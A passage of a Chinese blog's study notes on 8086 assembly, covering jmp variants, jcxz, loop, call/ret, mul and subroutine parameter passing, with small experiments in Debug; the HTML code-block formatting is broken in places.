class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  功能：ip=（16位寄存器）</span><br><span class="line"></span><br><span class="line">  **回顾2.11**</span><br><span class="line"></span><br><span class="line">  转移指令</span><br><span class="line"></span><br><span class="line">  1. 同时修改cs，ip的内容：</span><br><span class="line"></span><br><span class="line">     jmp 段地址：偏移地址</span><br><span class="line"></span><br><span class="line">     功能：用指令中给出的段地址修改cs，偏移地址修改ip</span><br><span class="line"></span><br><span class="line">     **注意：**这个指令只能在debug中使用，编译器并不认识</span><br><span class="line"></span><br><span class="line">  2. 仅修改ip的内容</span><br><span class="line"></span><br><span class="line">     jmp 某一合法寄存器</span><br><span class="line"></span><br><span class="line">  ![image-20240716140046220](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240716140046220.png)</span><br><span class="line"></span><br><span class="line">###  9.6 转移地址在内存中的jmp指令</span><br><span class="line"></span><br><span class="line">* 转移地址在内存中的jmp指令有两种格式</span><br><span class="line"></span><br><span class="line">  1. ```</span><br><span class="line">     jmp word ptr 内存单元地址（段内转移）</span><br></pre></td></tr></table></figure>   功能：从内存单元地址处开始存放着一个字，是转移的目的偏移地址   内存单元地址可用寻址方式的任一格式给出    如：   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">jmp word ptr ds:[0]</span><br><span class="line">执行后：（ip）=0123H</span><br><span class="line"></span><br><span class="line">mov ax,0123H</span><br><span class="line">mov [bx],ax</span><br><span class="line">jmp word ptr [bx]</span><br><span class="line">执行后：（ip）=0123H</span><br></pre></td></tr></table></figure>2. ```   jmp dword ptr 内存单元地址（段间转移）   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">功能:从内存单元地址处开始存放着两个字，高地址处的字是转移的目的段地址，低地址处是转移的目的偏移地址。</span><br><span class="line">(CS)=(内存单元地址+2)</span><br><span class="line">(IP)=(内存单元地址)</span><br><span class="line">内存单元地址可用寻址方式的任一格式给出。</span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line"></span><br></pre></td></tr></table></figure>   mov ax,0123H   mov ds:[0],ax   mov word ptr ds:[2],0   jmp dword ptr ds:[0]   执行后：(cs)=0  (ip)=0123H      mov ax,0123H   mov [dx],ax   mov word ptr [dx+2],0   jmp dword ptr [bx]   执行后：(cs)=0  (ip)=0123H   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">### 9.7 jcxz指令</span><br><span class="line"></span><br><span class="line">* jcxz指令为有条件转移指令，所有的有条件转移指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为-128~127。</span><br><span class="line"></span><br><span class="line">* ```</span><br><span class="line">  jcxz 标号 //如果(cx)=0，则转移到标号处执行</span><br></pre></td></tr></table></figure>操作：* 当(cx)=0时，(ip)=(ip)+8位位移  * 8位位移=“标号”处的地址-jcxz指令后的第一个字节的地址  * 8位位移的取值范围为-128~127，用补码表示  * 8位位移由编译程序在编译时算出* 当(cx)!=0时，程序不进行跳转，继续向下执行</code></pre></li><li><p>指令jcxz的功能相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if((cx)==0)</span><br><span class="line">jmp short 标号;</span><br></pre></td></tr></table></figure></li></ul><h3 id="9-8-loop指令"><a href="#9-8-loop指令" class="headerlink" title="9.8 loop指令"></a>9.8 loop指令</h3><ul><li><p>loop指令为循环指令，所有的循环指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址</p></li><li><p>对ip的修改范围 -128~127</p></li><li><pre><code>loop 标号  //((cx))=(cx)-1,如果(cx)！=0，转移到标号处执行<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  操作：</span><br><span class="line"></span><br><span class="line">  * (cx)=(cx)-1</span><br><span class="line">  * 当(cx)!=0时,(ip)=(ip)+8位位移</span><br><span class="line">    * 8位位移=“标号”处的地址-loop指令后的第一个字节的地址</span><br><span class="line">    * 8位位移的取值范围为-128~127，用补码表示</span><br><span class="line">    * 8位位移由编译程序在编译时算出</span><br><span class="line"></span><br><span class="line">  * 当cx=0，程序不进行跳转，继续向下执行</span><br><span class="line"></span><br><span class="line">* 指令loop的功能相当于</span><br><span class="line"></span><br></pre></td></tr></table></figure>(cx)--if((cx)!=0)    jmp short 标号<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* loop循环步骤</span><br><span class="line"></span><br><span class="line">  先执行循环中的程序—&gt;再将cx中的值减一—&gt;再判断cx是否为0</span><br><span class="line"></span><br></pre></td></tr></table></figure>dec指令的功能和inc相反，dec bx进行的操作位：(bx)=(bx)-1</code></pre></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 9.9 根据位移进行转移的意义</span><br><span class="line"></span><br><span class="line">* ```</span><br><span class="line">  jmp short 标号</span><br><span class="line">  jmp near ptr 标号</span><br><span class="line">  jcxz 标号</span><br><span class="line">  loop 标号</span><br></pre></td></tr></table></figure><p>  等几种汇编指令，它们对 IP的修改是根据转移目的地址和转移起始地址之间的位移来进行的。在它们对应的机器码中不包含转移的目的地址，而包含的是到目的地址的位移距离</p><ul><li><p>这样设计，方便了程序段在内存中的浮动装配</p><p>例如：<img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240724193454116.png" alt="image-20240724193454116"></p><ul><li><p>这段程序装在内存中的不同位置都可正确执行，因为 loops在执行时只涉及到s的位移(-4，前移 4个字节，补码表示为FCH)，而不是s的地址。</p></li><li><p>如果loop s的机器码中包含的是s的地址，则就对程序段在内存中的偏移地址有了严格的限制</p></li><li><p>因为机器码中包含的是s的地址，如果s处的指令不在目的地址处，程序的执行就会出错。</p></li><li><p>而loop s的机器码中包含的是转移的位移，就不存在这个问题了</p></li><li><p>因为，无论 s处的指令的实际地址是多少，1oop指令的转移位移是不变的。</p></li></ul></li></ul><h3 id="9-10-编译器对转移位移超界的检测"><a href="#9-10-编译器对转移位移超界的检测" class="headerlink" title="9.10 编译器对转移位移超界的检测"></a>9.10 编译器对转移位移超界的检测</h3><ul><li><p>注意，根据位移进行转移的指令，它们的转移范围受到转移位移的限制，如果在源程序中出现了转移范围超界的问题，在编译的时候，编译器将报错</p></li><li><p><strong>小实验</strong></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240724194655086.png" alt="image-20240724194655086"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240724194711136.png" alt="image-20240724194711136"></p><p>我们发现错误 jump out of range by 129 byte 跳出范围129字节表示超出了129个字节</p></li><li><p><strong>注意</strong><code>jmp 2000:0100</code>的转移指令，是在Debug 中使用的汇编指令，汇编编译器并不认识。<br>如果在源程序中使用，编译时也会报错。</p></li></ul><h2 id="10-call和ret指令"><a href="#10-call和ret指令" class="headerlink" title="10. call和ret指令"></a>10. call和ret指令</h2><ul><li><p>程序的加载与返回过程</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240725122356406.png" alt="image-20240725122356406"></p><p>这就是一个加载debug程序，再返回的过程</p></li><li><p>call和ret指令都是转移指令，他们都修改ip，或同时修改cs和ip</p></li><li><p>他们经常被共同用来实现自程序的设计</p></li></ul><h3 id="10-1-ret和retf"><a href="#10-1-ret和retf" class="headerlink" title="10.1 ret和retf"></a>10.1 ret和retf</h3><ul><li><p><code>ret</code>指令用栈中的数据，修改ip的内容，从而实现近转移</p></li><li><p>cpu执行ret指令时，进行下面两步操作：</p><ul><li>(ip)&#x3D;((ss)*16+(sp))</li><li>(sp)&#x3D;(sp)+2</li></ul></li><li><p><code>retf</code>指令用栈中的数据，修改cs和ip的内容，从而实现远转移</p></li><li><p>cpu执行retf指令时，进行下面四步操作</p><ul><li><p>(ip)&#x3D;((ss)*16+(sp))</p></li><li><p>(sp)&#x3D;(sp)+2</p></li><li><p>(cs)&#x3D;((ss)*16+(sp))</p></li><li><p>(sp)&#x3D;(sp)+2</p></li></ul></li><li><p>我们可以用汇编语法来解释ret和retf指令</p><ul><li><p>cpu执行ret指令时，相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop IP   //注意，无论是push ip还是pop ip都是不合法的，这里只是方便解释</span><br></pre></td></tr></table></figure></li><li><p>cpu执行retf指令时，相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop IP</span><br><span class="line">pop CS   </span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>实验</strong></p><p><strong>ret指令</strong></p><ol><li><p>编写程序</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240725130205572.png" alt="image-20240725130205572"></p></li><li><h6 id="……"><a href="#……" class="headerlink" title="……"></a>……</h6></li><li><p>观察调试过程</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240725130153322.png" alt="image-20240725130153322"></p></li><li><p>实验总结：这时我们可以知道ret指令相比于pop将数据输出给寄存器，会直接将数据赋值给ip</p></li></ol><p><strong>retf指令</strong></p><ol><li><p>编写程序</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240725130920970.png" alt="image-20240725130920970"></p></li><li><p>……</p></li><li><p>查看调试过程</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240725130957124.png" alt="image-20240725130957124"></p></li><li><p>我们发现程序可以正常退出，但并不能体现处retf的特色</p></li><li><p>我们重新编写一个程序：在这个程序中我们将正常退出的指令单独放在一个段中</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240725131851528.png" alt="image-20240725131851528"></p></li><li><p>……</p></li><li><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240725131837086.png" alt="image-20240725131837086"></p></li></ol></li></ul><h3 id="10-2-call指令"><a href="#10-2-call指令" class="headerlink" title="10.2 call指令"></a>10.2 call指令</h3><ul><li><p>call指令经常跟ret指令配合使用，因此cpu执行call执行，进行两步操作：</p><ul><li>将当前的ip或cs和ip压入栈中</li><li>转移（jmp）</li></ul></li><li><p>call指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令的原理相同</p></li></ul><h3 id="10-3-依据位移进行转移的call指令"><a href="#10-3-依据位移进行转移的call指令" class="headerlink" title="10.3 依据位移进行转移的call指令"></a>10.3 依据位移进行转移的call指令</h3><ul><li><pre><code>call 标号 //将当前的ip压栈后，转到标号处执行指令<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  cpu执行此种格式的call之指令时，进行如下操作</span><br><span class="line"></span><br><span class="line">  * (sp)=(sp)-2</span><br><span class="line"></span><br><span class="line">    ((ss)*16+(sp))=(ip)</span><br><span class="line"></span><br><span class="line">  * (ip)=(ip)+16位的位移</span><br><span class="line"></span><br><span class="line">* call 标号</span><br><span class="line">  * 16位位移=“标号”处的地址-call指令**后**的第一个字节的地址</span><br><span class="line">  * 16位位移的取值范围为-32768~32767，用补码表示</span><br><span class="line">  * 16位位移由编译程序在编译时算出</span><br><span class="line"></span><br><span class="line">**实验**</span><br><span class="line"></span><br><span class="line">1. 编写程序</span><br><span class="line"></span><br><span class="line">   ![image-20240725152136158](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240725152136158.png)</span><br><span class="line"></span><br><span class="line">2. ……</span><br><span class="line"></span><br><span class="line">3. 查看调试过程</span><br><span class="line"></span><br><span class="line">   ![image-20240725152254856](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240725152254856.png)</span><br><span class="line"></span><br><span class="line">4. 我们发现程序正常退出并没有进入无限循环</span><br><span class="line"></span><br><span class="line">5. 那如果没有退出代码呢</span><br><span class="line"></span><br><span class="line">   ![image-20240725152504458](C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240725152504458.png)</span><br><span class="line"></span><br><span class="line">   6. 这时我们再调试</span><br><span class="line"></span><br><span class="line">      ![image-20240725152605941](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240725152605941.png)</span><br><span class="line"></span><br><span class="line">      我们发现再ret之后就ip大跳到了其他地址</span><br><span class="line"></span><br><span class="line">      ![image-20240725154525656](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240725154525656.png)</span><br><span class="line"></span><br><span class="line">      再观察执行最后一个ret前的段地址 看见6AB8</span><br><span class="line"></span><br><span class="line">**小总结**</span><br><span class="line"></span><br><span class="line">上述实验我们并没有发现代码进入死循环，说明执行call指令时压入栈的ip，指向的时call指令的下一条指令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* cpu执行这种格式的call指令时，相当于进行：</span><br><span class="line"></span><br></pre></td></tr></table></figure>push IP     //这个IP是指向call的下一条指令jmp near ptr 标号<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">### 10.4 转移的目的地址在指令中的call指令</span><br><span class="line"></span><br><span class="line">* 前面讲解的call指令，其对应的机器指令中并没有转移的目的地址，而是相对于当前IP的转移位移。</span><br><span class="line"></span><br><span class="line">* ```</span><br><span class="line">  call far ptr 标号 //实现段间转移</span><br></pre></td></tr></table></figure>操作：* (sp)=(sp)-2  ((ss)*16+(sp))=(cs)  (sp)=(sp)-2  ((ss)*16+(sp))=(ip)* (cs)=标号所在的段地址  (ip)=标号所在的偏移地址</code></pre></li><li><p>cpu执行这种格式的call指令时，相当于进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push CS</span><br><span class="line">push IP    </span><br><span class="line">jmp far ptr 标号</span><br></pre></td></tr></table></figure></li></ul><h3 id="10-5-转移地址在寄存器中的call指令"><a href="#10-5-转移地址在寄存器中的call指令" class="headerlink" title="10.5 转移地址在寄存器中的call指令"></a>10.5 转移地址在寄存器中的call指令</h3><ul><li><pre><code>call 16位寄存器<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  功能：</span><br><span class="line"></span><br><span class="line">  * (sp)=(sp)-2</span><br><span class="line">  * ((ss)*16+(sp))=(ip)</span><br><span class="line">  * ip=（16位寄存器）</span><br><span class="line"></span><br><span class="line">* cpu执行这种格式的call指令时，相当于进行：</span><br><span class="line"></span><br></pre></td></tr></table></figure>push IP    jmp 16位寄存器<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">### 10.6 转移地址在内存中的call指令</span><br><span class="line"></span><br><span class="line">* 转移地址在内存中的call指令有两种格式：</span><br><span class="line"></span><br><span class="line">  * call word ptr 内存单元地址</span><br><span class="line">  * call dword ptr 内存单元地址</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">* call word ptr 内存单元地址</span><br><span class="line"></span><br><span class="line">  相当于：</span><br><span class="line"></span><br></pre></td></tr></table></figure>push IPjmp word ptr 内存单元地址<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">示例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>mov sp,10Hmov ax,0123Hmov ds:[0],axcall word ptr ds:[0]执行后：(ip)=0123H,(sp)=0EHmov sp,10Hmov ax,0123Hmov [bx],axcall word ptr [bx]执行后：(ip)=0123H,(sp)=0EH<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* call dword ptr 内存单元地址</span><br><span class="line"></span><br><span class="line">  相当于：</span><br><span class="line"></span><br></pre></td></tr></table></figure>push CSpush IPjmp dword ptr 内存单元地址<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">示例：</span><br><span class="line"></span><br></pre></td></tr></table></figure>mov sp,10Hmov ax,0123Hmov ds:[0],axmov word ptr ds:[2],0call dword ptr ds:[0]执行后：(cs)=0  (ip)=0123H (sp)=0CHmov sp,10Hmov ax,0123Hmov [dx],axmov word ptr [dx+2],0call dword ptr [bx]执行后：(cs)=0  (ip)=0123H (sp)=0CH<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">### 10.7 call和ret的配合使用</span><br><span class="line"></span><br><span class="line">* 我们已经分别学习了 ret 和call指令的原理。现在我们看一下，如何将它们配合使用来实现子程序的机制。</span><br><span class="line"></span><br><span class="line">* 分析代码1</span><br><span class="line"></span><br><span class="line">  ![image-20240725172451443](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240725172451443.png)</span><br><span class="line"></span><br><span class="line">  这个代码应该是先给ax赋值1，再给cx赋值3，执行call指令将 `mov bx ax`的偏移地址存入栈，再跳转到标号 `s`处，执行三次 `add ax,ax`，结束后ax的值是8，循环结束后执行ret，将栈中 `mov bx ax`的偏移地址取出并设置为新的ip，之后执行 `mov bx,ax`后退出程序</span><br><span class="line"></span><br><span class="line">  1. 前三条指令执行后，栈内是空的</span><br><span class="line"></span><br><span class="line">     ![image-20240725185805773](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240725185805773.png)</span><br><span class="line"></span><br><span class="line">  2. 但当call指令读入后，(ip)=000EH（此时的ip指向的是call指令之后的指令）,cpu指令指令缓冲器中的代码为`D8 05 00`</span><br><span class="line"></span><br><span class="line">     cpu执行`D8 05 00`，栈中的情况变为</span><br><span class="line"></span><br><span class="line">     ![image-20240725190125122](https://raw.githubusercontent.com/likunvs/images/main/images/image-20240725190125122.png)</span><br><span class="line"></span><br><span class="line">     然后 (ip)=(ip)+0005=0013H</span><br><span class="line"></span><br><span class="line">  3. cpu从`cs:0013H`处（标号s处）开始执行</span><br><span class="line"></span><br><span class="line">  4. ret指令读入后：(ip)=0016H，cpu指令缓冲器中的代码为C3</span><br><span class="line"></span><br><span class="line">     当cpu执行c3，相当于进行`pop ip`，执行后，栈中的情况为：</span><br><span class="line"></span><br><span class="line">     ![image-20240725190706877](C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240725190706877.png)</span><br><span class="line"></span><br><span class="line">  5. cpu回到`cs:000EH`处（ip指向的是call指令之后的指令），继续执行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* call指会后面的指令的地址将存储在栈中，所以可以在子程序的后面使用 ret指令，用栈中的数据设置IP的值，从而转到 call 指令后面的代码处继续执行。</span><br><span class="line"></span><br><span class="line">* 这样我们可以利用call和ret来实现子程序的机制</span><br><span class="line"></span><br><span class="line">![image-20240725191607473](C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240725191607473.png)</span><br><span class="line"></span><br><span class="line">### 10.8 mul指令</span><br><span class="line"></span><br><span class="line">* mul是乘法指令</span><br><span class="line">* 使用mul做乘法的时候</span><br><span class="line">  * 相乘的两个数：要么都是8位，要么都是16位</span><br><span class="line">    * 8位：al中和8位寄存器或内存字节单元中</span><br><span class="line">    * 16位：ax中和16位寄存器或内存单元中</span><br><span class="line">  * 结果</span><br><span class="line">    * 8位：ax中</span><br><span class="line">    * 16位：DX（高位）和AX（低位）中</span><br><span class="line"></span><br><span class="line">* ```</span><br><span class="line">  mul reg</span><br><span class="line">  mul 内存单元</span><br></pre></td></tr></table></figure></code></pre></li><li><p>内存单元可以用不同的寻址方式给出（8.4）</p><ul><li><pre><code>mul byte ptr ds:[0]含义为:(ax)=(al)*((ds)*16+0)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* ```</span><br><span class="line">  mul word ptr [bx+si+8]</span><br><span class="line">  </span><br><span class="line">  含义为:</span><br><span class="line">  (ax)=(ax)*((ds)*16+(bx)+(si)+8)结果的低16位;</span><br><span class="line">  (dx)=(ax)*((ds)*16+(bx)+(si)+8)结果的高16位;</span><br></pre></td></tr></table></figure></code></pre></li></ul></li></ul><p><strong>实验</strong></p><ol><li><p>问题1：我们直接mul idata</p><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240725195357149.png" alt="image-20240725195357149"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240725195419844.png" alt="image-20240725195419844"></p><p>报错</p></li><li><p>问题2：研究8位还是16位是不是al，ax决定的</p><ol><li><p>编写代码</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240726101644608.png" alt="image-20240726101644608"></p></li><li><p>逐个分析</p></li><li><p>情况1</p><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240726101758363.png" alt="image-20240726101758363"></p><p>我们发现在al*bl的过程中，算出的是16位的数据</p></li><li><p>情况2</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240726102031753.png" alt="image-20240726102031753"></p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240726102138250.png" alt="image-20240726102138250"></p><p>我们发现在al*bx的情况下，成功计算出32位的答案</p></li><li><p>情况3</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240726102338726.png" alt="image-20240726102338726"></p><p>我们在ax*bl的情况下不能判断计算出的数据位</p></li><li><p>情况4</p><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240726102559292.png" alt="image-20240726102559292"></p><p>我们在ax*bx中算出了32位数据</p></li><li><p>在上述实验中我们知道如果<code>mul 16位数据</code>算出的结果是32位的，但是不能决定<code>mul 8位数据</code>是否算出的是16位数据</p></li><li><p>编写代码</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240726103439842.png" alt="image-20240726103439842"></p></li><li><p>情况1</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20240726103530866.png" alt="image-20240726103530866"></p><p>我们发现还是8位的数据相乘，说明主要是看mul后面的位</p></li><li><p>情况2</p><p><img src="C:/Users/lkh_2/AppData/Roaming/Typora/typora-user-images/image-20240726103735649.png" alt="image-20240726103735649"></p><p>由这个可以确定就是看mul后面数据的位数</p></li></ol></li></ol><p><strong>实验总结</strong></p><p>由上述实验我们可以确定 mul判断是多少位的数据相乘是看mul后的数据是多少位，如果mul后的数据是8位，就读取al，反之如果mul后的数据是16位，就读取ax</p><h3 id="10-9-模块化程序设计"><a href="#10-9-模块化程序设计" class="headerlink" title="10.9 模块化程序设计"></a>10.9 模块化程序设计</h3><ul><li><p>call 与 ret 指令共同支持了汇编语言编程中的模块化设计。在实际编程中，程序的模块化是必不可少</p></li><li><p>因为现实的问题比较复杂，对现实问题进行分析时，把它转化成为相互联系、不同层次的子问题，是必须的解决方法</p></li><li><p>而call和ret指会对这种分析方法提供了程序实现上的支持。利用 call和ret指令，我们可以用简洁的方法，实现多个互相联系、功能独立的子程序来解决一个复杂的问题。</p></li></ul><h3 id="10-10-参数和结果的传递问题"><a href="#10-10-参数和结果的传递问题" class="headerlink" title="10.10 参数和结果的传递问题"></a>10.10 参数和结果的传递问题</h3><ul><li><p>子程序一般都要根据提供的参数处理一定的事务，处理后，将结果(返回值)提供给调用者</p></li><li><p>其实，我们讨论参数和返回值传递的问题，实际上就是在探讨，应该如何存储子程序需要的参数和产生的返回值。</p></li></ul><p><strong>问题</strong></p><ul><li><p>设计一个子程序，可以根据提供的N，来计算N的3次方:<br>这里面就有两个问题:<br>(1)将参数N存储在什么地方?<br>(2) 计算得到的数值，存储在什么地方?</p></li><li><p>很显然，可以用寄存器来存储，可以将参数放到bx中;因为子程序中要计算N*N *N，可以使用多个 mul指令，为了方便，可将结果放到 dx和 ax中。</p></li><li><p>我们可以编一个子程序</p><ul><li><p>说明：计算N的3次方</p></li><li><p>参数：(bx)&#x3D;N</p></li><li><p>结果：(dx:ax)&#x3D;N^3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cube mov ax,bx</span><br><span class="line"> mul bx</span><br><span class="line"> mul bx</span><br><span class="line"> 